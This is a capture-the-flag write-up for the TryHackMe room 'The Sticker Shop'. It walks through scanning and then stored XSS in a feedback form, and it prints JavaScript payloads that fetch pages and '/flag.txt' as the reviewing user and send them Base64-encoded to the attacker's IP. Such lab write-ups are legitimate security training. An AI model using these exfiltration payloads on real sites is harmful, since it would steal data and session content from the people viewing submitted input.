---
title: "The Sticker Shop"
author: c3l1kd
categories: [TryHackMe]
tags: [xss,exploit,scanning]
render_with_liquid: false
img_path: /images/tryhackme_the_sticker_shop/
image:
  path: room_image.png
---
**The Sticker Shop** Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

Can you read the flag at `http://MACHINE_IP:8080/flag.txt?`

## Initial Enumeration
### Nmap Scan
We start with a Nmap scan and find only two open ports. Port `22` on which we have SSH available and port `8080` on which a Python Werkzeug server is running, a cat sticker shop

![nmap](01.webp){: width="1200" height="800" }

The index page has some stickers to offer. Besides that, we have a Feedback page.

![nmap](02.webp){: width="1200" height="800" }

On the feedback page, we can give some feedback, that is shortly after reviewed by the staff. This sounds like `XSS` might be our entry point.

![nmap](03.webp){: width="1200" height="800" }

## Exploit XSS

The challenge tasks us to retrieve the flag at `http://10.10.49.166:8080/flag.txt` and utilize client side exploitation. 

Furthermore it states that `they decided to develop and host everything on the same computer`.

> Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!
> Can you read the flag at `http://10.10.49.166:8080/flag.txt?`  
{: .prompt-tip }

Currently we are not allowed to access `http://10.10.49.166:8080/flag.txt`.

![nmap](04.webp){: width="1200" height="800" }

We get back to the feedback page and prepare some XSS payloads.
![nmap](05.webp){: width="1200" height="800" }

First, we want to test for simple XSS. If we get a response back to our web server, we have confirmed XSS.

```console
<script src="http://10.14.90.235/feedback"></script>
```

![nmap](06.webp){: width="1200" height="800" }

We get a response back, so let's craft a payload to make a request as the user to the page.
![nmap](07.webp){: width="1200" height="800" }

The next thing to do is to craft a  JavaScript payload to exfiltrate the response of a fetch request to the root path `(/)` of the current origin. It sends the text content of the fetched response, encoded in Base64 `(btoa)`, to a remote server at `http://10.14.90.235/` using another fetch request. we uses no-cors mode to bypass CORS restrictions and `credentials: 'same-origin'` to include cookies or credentials for the initial request, potentially allowing it to capture sensitive data from the target application.
```console
<script>
fetch("/", {method:'GET',mode:'no-cors',credentials:'same-origin'})
  .then(response => response.text())
  .then(text => { 
    fetch('http://10.14.90.235/' + btoa(text), {mode:'no-cors'}); 
  });
</script>
```
We get a base64-encoded response back.

![nmap](08.webp){: width="1200" height="800" }

We successfully got the index page by the user reviewing the feedback.

![nmap](09.webp){: width="1200" height="800" }

Now we adapt the payload to include the `flag.txt`.
```console
<script>
fetch("/flag.txt", {method:'GET',mode:'no-cors',credentials:'same-origin'})
  .then(response => response.text())
  .then(text => { 
    fetch('http://10.14.90.235/' + btoa(text), {mode:'no-cors'}); 
  });
</script>
```
After we have submitted our payload, we get a connection back to our web server.
![nmap](10.webp){: width="1200" height="800" }
And it is the flag.

![nmap](11.webp){: width="1200" height="800" }
